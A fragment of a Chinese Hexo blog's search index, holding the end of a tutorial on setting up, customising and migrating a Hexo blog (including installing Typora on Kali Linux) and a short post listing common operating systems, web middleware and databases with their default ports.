title="5、博客内部文章跳转"></a>5、博客内部文章跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">&#123;% post_link 文章文件名（不要后缀） 文章标题（可选） %&#125;</span><br><span class="line"></span><br><span class="line">#如跳转至文章文件名为Hello-World.md：</span><br><span class="line">&#123;% post_link Hello-World %&#125;</span><br><span class="line">&#123;% post_link Hello-World 你好世界 %&#125;</span><br></pre></td></tr></table></figure><h3 id="6、图片懒加载"><a href="#6、图片懒加载" class="headerlink" title="6、图片懒加载"></a>6、图片懒加载</h3><p>在<code>_config.yml</code>中添加如下，需要保证loading.gif 文件存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: true</span><br><span class="line">  loadingImg: /img/loading.gif</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/image-20240217120654924.png" alt="image-20240217120654924"></p><h3 id="7、评论功能（未实现）"><a href="#7、评论功能（未实现）" class="headerlink" title="7、评论功能（未实现）"></a>7、评论功能（未实现）</h3><p>需提前到<a href="https://console.leancloud.app/">leanclound 官网</a> 注册登录创建一个新的应用，进入应用，在左下角设置中找到appid、appkey</p><p>修改<code>_config.brea.yml</code>配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appId: 你的LeanCloud应用ID</span><br><span class="line">  appKey: 你的LeanCloud应用Key</span><br><span class="line">  avatar: &quot;mm&quot;  # 头像风格</span><br><span class="line">  serverURLs: &#x27;https://your-valine-server.leancloudapp.com&#x27; #如果你有自己的 Valine 服务器</span><br><span class="line">  bg: &quot;#f7f7f7&quot;  # 设置评论框背景颜色为浅灰色</span><br><span class="line">  visitor: false #访问者的IP、时间等信息</span><br><span class="line">  option:</span><br><span class="line">    notify: false  # 邮件通知</span><br><span class="line">    verify: false  # 验证码</span><br><span class="line">    placeholder: &quot;说点什么吧...&quot;  # 评论框的占位符</span><br><span class="line">    guest_info: [&quot;昵称&quot;, &quot;邮箱&quot;, &quot;网站&quot;]  # 允许匿名评论的字段</span><br><span class="line">    recoredIP: true #记录评论者的IP地址</span><br></pre></td></tr></table></figure><p>并安装valine：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install valine -g</span><br></pre></td></tr></table></figure><p>头像风格有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;mm&quot;: 神秘人（Mystery Man）</span><br><span class="line">&quot;identicon&quot;: 身份图标</span><br><span class="line">&quot;wavatar&quot;: 基于邮箱的卡通头像</span><br><span class="line">&quot;monsterid&quot;: 怪物头像</span><br><span class="line">&quot;retro&quot;: 复古像素风格</span><br><span class="line">&quot;hide&quot;: 隐藏头像</span><br></pre></td></tr></table></figure><h3 id="8、hexo镶嵌B站视频"><a href="#8、hexo镶嵌B站视频" class="headerlink" title="8、hexo镶嵌B站视频"></a>8、hexo镶嵌B站视频</h3><p>将下面的src 的内容替换成B站视频的分享下面的【镶嵌代码】的链接（而不是视频的分享链接）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=90978812&amp;cid=155358422&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot; style=&quot;position: absolute; width: 100%; height: 100%; Left: 0; top: 0;&quot; &gt;&lt;/iframe&gt;&lt;/div&gt;</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><h2 id="五、Linux安装Typora"><a href="#五、Linux安装Typora" class="headerlink" title="五、Linux安装Typora"></a>五、Linux安装Typora</h2><p>官方文档：<a href="https://www.typora.net/364.html">在Linux上安装Typora | typora中文网</a></p><p>Typora 是一款流行的Markdown编辑器，支持多种操作系统，包括Linux。根据搜索结果[^12^]，Typora 可以在 Kali Linux 上安装和运行。安装Typora的步骤如下：</p><ol><li><p>导入Typora的官方GPG密钥：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>添加Typora的APT仓库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\ndeb https://typora.io/linux ./&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/apt/sources.list</span><br></pre></td></tr></table></figure></li><li><p>更新本地APT仓库索引：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></li><li><p>安装Typora：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install typora</span><br></pre></td></tr></table></figure></li></ol><p>如果在安装过程中遇到问题，可以参考官方文档或社区提供的解决方案。例如，如果遇到SUID sandbox helper binary配置问题，可以尝试设置正确的权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 4755 /usr/share/typora/chrome-sandbox</span><br></pre></td></tr></table></figure><p>此外，如果遇到NSS版本过时的问题，可以确保安装了最新的NSS库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install libnss3</span><br></pre></td></tr></table></figure><p>这些步骤和解决方案应该可以帮助你在Kali Linux上成功安装并运行Typora。</p><h2 id="六、Hexo博客迁移"><a href="#六、Hexo博客迁移" class="headerlink" title="六、Hexo博客迁移"></a>六、Hexo博客迁移</h2><h3 id="1、git备份迁移"><a href="#1、git备份迁移" class="headerlink" title="1、git备份迁移"></a>1、git备份迁移</h3><p>参考链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV13g41147yV/</span><br><span class="line">https://wokron.github.io/posts/hexo-blog-migration/</span><br></pre></td></tr></table></figure><p>1、创建Gitee或Github 私人仓库</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240611221405736.png" alt="image-20240611221405736"></p><p>2、链接私人仓库。严格按照这里来</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240611221447804.png" alt="image-20240611221447804"></p><p>在博客目录下执行（最好在git的bash 下执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@xxx&quot;</span><br><span class="line"></span><br><span class="line">git init </span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://gitee.com/lusensec/hexo_backup.git</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line"></span><br><span class="line">//如果hexo有主题，导致出错，把themes文件夹先移动走，等迁移成功后再覆盖themes</span><br></pre></td></tr></table></figure><p>这样，所有的博客内容都将上传到仓库</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240612134929139.png" alt="image-20240612134929139"></p><p>3、迁移至其他地方</p><p>在要迁移的空白文件夹克隆该博客备份仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@gitee.com:lusensec/hexo_backup.git</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/image-20240612135223145.png" alt="image-20240612135223145"></p><p>之后使用npm 重新加载配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install</span><br></pre></td></tr></table></figure><p>之后我们将重新部署</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240612135505611.png" alt="image-20240612135505611"></p><h3 id="2、本地迁移"><a href="#2、本地迁移" class="headerlink" title="2、本地迁移"></a>2、本地迁移</h3><p>这里直接用一种粗暴的方法，对hexo博客文件夹和文件备份到本地或硬盘，需要备份的文件夹和文件有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">source 文件夹：包含所有文章的Markdown文件。</span><br><span class="line">themes 文件夹：如果你有自定义的主题或修改过的主题。</span><br><span class="line">_config.yml 和其他配置文件：包含博客的配置信息。（_config.butterfly.yml、package.json）</span><br><span class="line">node_modules 文件夹：包含所有依赖的Node.js模块。</span><br><span class="line">public 文件夹：包含生成的静态文件，如果你希望保留旧的构建结果。</span><br></pre></td></tr></table></figure><p>我们直接将上述文件夹和文件进行压缩备份，或者直接复制到一个外部存储设备，如U盘、移动硬盘或云存储。</p><p>之后在新的设备路径安装环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init new_blog_folder</span><br><span class="line">cd new_blog_folder</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>之后将备份的资源复制到新电脑上的Hexo项目文件夹中，替换掉新创建的项目的对应文件夹和文件。</p><p>这将根据package.json 文件安装所有必要的依赖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>检查并更新_config.yml和其他配置文件，确保它们适用于新环境。</p><p>之后重新进行本地和远端部署。</p><h2 id="七、遇到的坑"><a href="#七、遇到的坑" class="headerlink" title="七、遇到的坑"></a>七、遇到的坑</h2><h4 id="1、什么什么-is-e’mpty-以及-master-错误"><a href="#1、什么什么-is-e’mpty-以及-master-错误" class="headerlink" title="1、什么什么 is e’mpty 以及 master 错误"></a>1、什么什么 is e’mpty 以及 master 错误</h4><p><img src="/img/Extracurricular-experience-hexo-build/image-20240218124007996.png" alt="image-20240218124007996"></p><p><strong>解决办法：</strong>将博客目录下的<code>.deploy_git</code>文件夹删除，或者以防万一先把该文件夹移动到非博客目录下，之后重新执行上传操作即可。这将重新编译，耗时较长</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240218125607789.png" alt="image-20240218125607789"></p><h4 id="2、GitHub连接不上"><a href="#2、GitHub连接不上" class="headerlink" title="2、GitHub连接不上"></a>2、GitHub连接不上</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解决办法参考链接：https://zhuanlan.zhihu.com/p/521340971</span><br></pre></td></tr></table></figure><h4 id="3、编译出错"><a href="#3、编译出错" class="headerlink" title="3、编译出错"></a>3、编译出错</h4><p><img src="/img/Extracurricular-experience-hexo-build/image-20240517214405161.png" alt="image-20240517214405161"></p><p>这里推测是因为存在<code>[]或者空格</code>的原因，将<code>[]</code>换成<code>【】</code>即可。在头部不能随便出现<code>[]</code></p><h2 id="八、参考链接"><a href="#八、参考链接" class="headerlink" title="八、参考链接"></a>八、参考链接</h2><p>1、hexo博客搭建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/305812430</span><br><span class="line">https://www.fomal.cc/posts/e593433d.html</span><br></pre></td></tr></table></figure><p>2、hexo主题butterfly 美化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/mjh1667002013/article/details/129290903</span><br><span class="line">https://butterfly.js.org/posts/4aa8abbe/</span><br><span class="line">hexo-Butterfly美化日记：https://blog.guole.fun/posts/butterfly-custom/index.html</span><br></pre></td></tr></table></figure><p>3、Hexo中Buttefly 主题被百度，Bing等搜索引擎收录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://mtw.so/6adHnx</span><br><span class="line">https://moonshuo.cn/posts/6356.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】网络安全常见名词</title>
      <link href="/2024/02/11/Nouns-Basic/"/>
      <url>/2024/02/11/Nouns-Basic/</url>
      
        <content type="html"><![CDATA[<h3 id="一、常见的操作系统"><a href="#一、常见的操作系统" class="headerlink" title="一、常见的操作系统"></a>一、常见的操作系统</h3><p><img src="/img/Nouns-Basic/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.png" alt="操作系统"></p><h3 id="二、常见的中间件"><a href="#二、常见的中间件" class="headerlink" title="二、常见的中间件"></a>二、常见的中间件</h3><ul><li>Apache：Apache是最流行的Web服务器之一，它也被广泛用作Web中间件。Apache支持多种编程语言和操作系统，提供了灵活的配置和扩展性。</li><li>Nginx：Nginx是一个高性能的Web服务器和反向代理服务器，它也可以作为Web中间件使用。Nginx支持负载均衡、缓存、SSL加密等功能，适用于高并发和分布式应用场景。</li><li>IIS：IIS是Microsoft开发的Web服务器和应用程序服务器，它也可以作为Web中间件使用。IIS支持ASP.NET、PHP和Node.js等技术，适用于Windows平台的Web应用程序开发和部署。</li><li>Tomcat：Tomcat是一个开源的Java Servlet容器，也可以作为Web中间件使用。Tomcat支持JSP、Servlet和WebSocket等技术，适用于Java Web应用程序的部署和管理。</li><li>WebLogic是Oracle开发的Java应用程序服务器，支持J2EE技术规范和其他Web服务协议。它提供了高度可扩展性、高可用性、安全性和管理性，适用于大型企业级应用程序的部署和管理，支持Java Web应用程序的部署和管理，同时也支持其他技术如SOA和微服务架构等</li></ul><h3 id="三、常见的数据库"><a href="#三、常见的数据库" class="headerlink" title="三、常见的数据库"></a>三、常见的数据库</h3><ul><li>关系型数据库：如MySQL（3306）、SQL Server（1433常常配合IIS中间件在win server机器上运行）、Oracle（1521）、PostgreSQL（5432）等，它们使用表格形式组织数据，通过关系进行数据的存储和管理。</li><li>非关系型数据库：如MongoDB（27017）、Redis（6379）等，它们不使用传统的表格结构，而是采用键值对、文档、列族、图等方式进行数据的存储和查询。</li></ul><p>其他常见网络安全词汇：<a href="https://zhuanlan.zhihu.com/p/575141390">https://zhuanlan.zhihu.com/p/575141390</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
